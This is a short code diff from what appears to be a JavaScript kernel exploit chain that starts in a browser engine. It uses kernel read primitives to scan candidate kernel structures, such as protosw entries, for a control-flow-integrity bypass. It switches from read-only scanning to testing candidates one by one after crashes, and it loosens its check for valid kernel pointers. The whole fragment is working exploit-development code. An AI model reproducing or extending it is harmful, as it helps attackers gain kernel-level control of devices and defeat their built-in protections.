@@ -696,9 +696,14 @@ async function main(userlandRW, wkOnly = false) {
         ];
 
         // Which candidate to test (set to index, or -1 for read-only mode)
-        const CFI_TEST_INDEX = -1;  // CHANGE THIS TO TEST: 0, 1, 2, etc.
+        // START WITH 0 (protosw_1), increment if crash, until we find one that doesn't crash
+        const CFI_TEST_INDEX = 0;  // <-- CHANGE THIS: 0, 1, 2, ... after each crash
 
         await log("[CFI TEST] Scanning " + cfi_test_candidates.length + " candidates...", LogLevel.INFO);
+
+        // Get kernel base range for validation
+        const kdataLow = krw.kdataBase.low >>> 0;
+        const kernelRangeHi = (kdataLow >>> 24) & 0xff;  // e.g., 0x83
 
         for (let i = 0; i < cfi_test_candidates.length; i++) {
             const c = cfi_test_candidates[i];
@@ -708,9 +713,10 @@ async function main(userlandRW, wkOnly = false) {
                 const val = await krw.read8(addr);
                 const valHex = hex64(val);
 
-                // Check if looks like kernel .text pointer (0xffffffffdXXXXXXX)
+                // Check if looks like kernel pointer (hi=0xffffffff, reasonable range)
+                const valTopByte = (val.low >>> 24) & 0xff;
                 const isValid = (val.hi >>> 0) === 0xffffffff &&
-                               ((val.low >>> 24) & 0xff) >= 0xd0;
+                               valTopByte >= 0x80 && valTopByte <= 0xff;
 
                 const marker = isValid ? "VALID" : "not-ptr";
                 await log(`[${i}] ${c.name}: ${valHex} [${marker}]`,
